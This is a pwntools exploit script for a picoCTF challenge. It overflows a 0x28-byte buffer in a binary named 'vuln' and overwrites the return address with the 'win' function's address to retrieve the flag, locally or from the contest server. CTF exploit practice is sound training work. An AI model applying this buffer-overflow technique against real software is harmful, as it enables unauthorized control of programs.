#!/usr/bin/env python3

from pwn import *

exe = ELF("./vuln")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r)
    else:
        r = remote("mysterious-sea.picoctf.net", 57060)

    return r


def main():
    r = conn()

    r.sendlineafter(b"your name: ", b"A" * 0x28 + p64(exe.sym.win))
    flag = r.recvlines(3)[-1].decode()
    log.success(f"Flag: {flag}")


if __name__ == "__main__":
    main()
